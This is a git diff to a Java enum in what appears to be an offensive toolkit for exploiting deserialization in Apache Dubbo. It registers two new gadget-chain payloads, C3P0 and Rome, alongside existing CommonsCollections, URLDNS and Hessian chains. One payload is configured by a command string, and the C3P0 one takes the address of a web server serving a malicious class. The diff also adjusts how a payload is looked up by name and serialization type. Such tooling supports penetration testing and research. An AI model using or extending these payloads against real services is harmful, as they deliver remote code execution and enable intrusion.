@@ -4,6 +4,7 @@ import com.threedr3am.exp.dubbo.payload.hessian.ResinPoc;
 import com.threedr3am.exp.dubbo.payload.hessian.RomePoc;
 import com.threedr3am.exp.dubbo.payload.hessian.SpringAbstractBeanFactoryPointcutAdvisorPoc;
 import com.threedr3am.exp.dubbo.payload.hessian.XBeanPoc;
+import com.threedr3am.exp.dubbo.payload.java.C3P0;
 import com.threedr3am.exp.dubbo.payload.java.CommonsBeanutils;
 import com.threedr3am.exp.dubbo.payload.java.CommonsBeanutils1;
 import com.threedr3am.exp.dubbo.payload.java.CommonsCollections1;
@@ -20,6 +21,7 @@ import com.threedr3am.exp.dubbo.payload.java.CommonsCollections6ForLoadJar;
 import com.threedr3am.exp.dubbo.payload.java.CommonsCollections7;
 import com.threedr3am.exp.dubbo.payload.java.CommonsCollections8;
 import com.threedr3am.exp.dubbo.payload.java.CommonsCollections9;
+import com.threedr3am.exp.dubbo.payload.java.Rome;
 import com.threedr3am.exp.dubbo.payload.java.URLDNS;
 
 /**
@@ -48,6 +50,8 @@ public enum Payloads {
   CommonsCollections10("CommonsCollections10", 1, new CommonsCollections10(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.1"),
   CommonsCollections11("CommonsCollections11", 1, new CommonsCollections11(), "arg[0]=cmd", "java", "commons-collections:commons-collections:3.2.1"),
   URLDNS("URLDNS", 1, new URLDNS(), "arg[0]=dns server url", "java", ""),
+  C3P0("C3P0", 2, new C3P0(), "arg[0]=恶意类所在web服务器ip，例：http://127.0.0.1:8080/，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的", "java", "com.mchange:c3p0:0.9.5.2  com.mchange:mchange-commons-java:0.2.11"),
+  ROME_JAVA("rome", 1, new Rome(), "arg[0]=cmd", "java", "com.rometools:rome:*"),
 
   ;
 
@@ -98,11 +102,11 @@ public enum Payloads {
     Payloads[] payloads = Payloads.values();
     Payloads res = null;
     for (int i = 0; i < Payloads.values().length; i++) {
-      if (payloads[i].name.equalsIgnoreCase(name)) {
+      if (payloads[i].name.equalsIgnoreCase(name) && payloads[i].serialization.equalsIgnoreCase(serialization)) {
         res = payloads[i];
         break;
       }
     }
-    return res.getSerialization().equalsIgnoreCase(serialization) ? res : null;
+    return res;
   }
 }
